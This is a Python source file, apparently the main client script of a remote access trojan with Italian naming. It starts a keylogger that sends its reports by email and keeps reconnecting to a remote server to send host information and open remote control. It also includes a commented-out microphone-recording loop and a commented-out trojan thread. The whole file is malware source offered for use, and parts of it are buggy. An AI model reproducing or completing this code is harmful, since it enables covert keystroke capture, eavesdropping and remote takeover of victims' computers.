import os
import traceback
from threading import Thread
from remoteCommandsClient import *
import speech_recognition as sp
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import shutil

ascoltato=[]
indexA=0
def ascolto():

    while True:
        try:
            freq = 44100
            duration = 20
            recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
            sd.wait()
            #write("recording" + str(indexA) + ".wav", freq, recording)
            ascoltato[indexA]=recording
            indexA=indexA+1
        except:
            pass

def main():
    try:
        #signal.signal(signal.SIGINT, signalHandler)
        client = clientConnection()
        if client == "errore":
            raise Exception
        else:
            client.setblocking(True)
            time.sleep(3)
            sendInfo(client)

            try:
                time.sleep(7)
                openRemoteControl(client)

            except Exception as e:
                if e.__class__.__name__ == "ConnectionResetError":
                    raise e
                raise e

            client.setblocking(False)
            client.send(1024)
            client.close()

    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            raise e
        else:
            raise e


def avvio():
    while True:
        try:
            main()
        except:
            time.sleep(5)


if __name__ == "__main__":
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")

    #thread_trojan = Thread(target=trojanBehaviour)
    #thread_trojan.start()

    thread_remoteControl = Thread(target=avvio)
    thread_remoteControl.start()

    #thread_ascolto = Thread(target=ascolto)
    #thread_ascolto.start()

    thread_key = Thread(target=keylogger.start())
    thread_key.start()

    #thread_trojan.join()
    thread_remoteControl.join()
    #thread_ascolto.join()
    thread_key.join()
